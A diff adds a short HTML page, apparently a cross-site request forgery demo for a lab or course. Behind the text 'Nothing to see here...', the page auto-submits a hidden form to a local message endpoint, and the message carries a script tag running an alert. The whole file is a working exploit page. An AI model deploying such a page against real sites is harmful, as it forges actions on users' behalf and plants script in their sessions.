@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>C-Surf</title>
+</head>
+<body>
+<p>Nothing to see here...</p>
+<form method="POST" action="http://localhost:8080/message" style="visibility: hidden">
+    <input name="text" type="hidden" value="🏄‍♂️🌊 I just got C-Surfed <script>alert('hello')</script>">
+</form>
+<script>
+    document.forms[0].submit();
+</script>
+</body>
+</html>
